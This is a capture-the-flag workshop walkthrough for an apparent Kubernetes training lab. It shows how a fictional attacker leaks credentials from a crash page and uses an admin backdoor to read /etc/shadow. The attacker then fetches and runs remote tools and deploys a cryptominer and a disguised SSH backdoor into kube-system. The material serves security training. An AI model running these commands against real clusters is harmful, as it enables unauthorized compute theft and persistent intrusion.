# Free Compute: Scenario 1 Attack

## Warning

In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment.

In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.

## Backstory

### Name: __Red__

* Opportunist
* Easy money via crypto-mining
* Uses automated scans of web IP space looking for known exploits and vulnerabilities

### Motivations

* __Red__ has been mining `bitcoinero` for a few months now, and it's starting to gain some value
* __Red__ is looking for free-to-them compute on which to run miners
* __Red__ purchased some leaked credentials from the dark web

## Thinking In Graphs

Attacking a system is a problem-solving process similar to troubleshooting: __Red__ begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned.

The general process looks like this:

![attack lifecycle](img/attack-lifecycle.png)

* __Study__

    In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, `nmap` is commonly used to enumerate IP networks. `nikto`, `burp`, and `sqlmap` are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as `uname`, `winver`, and `netstat` provide a wealth of information about their host OSes.

* __Plan__

    In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more.

* __Attack Something__

    In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate.

* __Persist__

    In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords.

* __Win__

    Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.

## Getting Access

__Red__ team found an app online and ran a [dictionary attack](https://www.techtarget.com/searchsecurity/definition/dictionary-attack) against it.  Some valid paths were `/crash` and `/admin`.  Let's try to find an exploit!

To find the compromised website, run the following:
```
./scenario_1/attack-1-helper.sh
```

In your browser, go to URL provided (e.g. `http://<IP>:8080/`)

Hmm.  "Nothing to see here."?  They're probably wrong.

Let's try the Admin page: `http://<IP>:8080/admin`.  Hrm.  It's asking for credentials.  Since it was a browser popup (instead of an in-app request), it probably uses [Basic Auth](https://en.wikipedia.org/wiki/Basic_access_authentication).

Let's try the Crash page: `http://<IP>:8080/crash`

Looks like we've crashed the app!  And it prints out all of the environment variables.  Oh goodie.  There's two that seem to be especially interesting (AUTH_USERNAME and AUTH_PASSWORD).  Let's go back to the Admin page and try those.

Go back to the Admin page: `http://<IP>:8080/admin` and enter the credentials we just got.  

And we're in!  Looks like Frank left a backdoor to run some commands.  Let's see what we can learn:

```console
id
```

```console
uname -a
```

```console
cat /etc/lsb-release
```

```console
ps -ef
```

```console
df -h
```

Note that there are very few processes running. This is probably a container.

```console
cat /etc/shadow
```
```console
ls -l /
```
```console
ls -l $PWD
```
```console
echo $PATH
```

Can we add files to the default PATH?
```console
touch /usr/local/bin/foo && ls /usr/local/bin/
```

```console
cd /usr/local/bin; curl https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
```

That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container and verify with [amicontained](https://github.com/genuinetools/amicontained):

```console
cd /usr/local/bin; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
```

This tells us several things:

* We are in a container, and it's probably managed by Kubernetes
* Some security features are not in use (userns)
* Seccomp is disabled, but a number of Syscalls are blocked
* We don't have any exciting capabilities. <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">Click for more capabilities info.</a>

Now let's inspect our Kubernetes environment:

```console
env | grep -i kube
```
```console
ls /var/run/secrets/kubernetes.io/serviceaccount
```

# Deploy Bitcoin miner + backdoor

We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:

```console
cd /usr/local/bin; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl
```
```console
kubectl get all
```
What workloads are deployed in all of the namespaces?
```console
kubectl get all -A
```
What operations can I run on this cluster?
```console
kubectl auth can-i --list
```
Can I create pods?
```console
kubectl auth can-i create pods
```

It looks like we have hit the jackpot! Let's see if we can start mining some crypto.
```console
kubectl apply -f https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml; sleep 10; kubectl get pods
```

We can see the bitcoinero pod running, starting to generate a small but steady stream of cryptocurrency. But we need to take a few more steps to protect our access to this lucrative opportunity. Let's deploy an SSH server on the cluster to give us a backdoor in case we lose our current access later.

```console
kubectl apply -n kube-system -f https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/scenario_1/backdoor.yaml
```

Wait ~10 seconds for the Public IP to be exposed
```console
kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}'
```

Our Bitcoin miner is now deployed and we've also deployed an SSH backdoor.  Mission Accomplished.

## Completion

You've completed Scenario 1 Attack.  Now let's go to [Scenario 1 Defense](scenario_1_defense/).
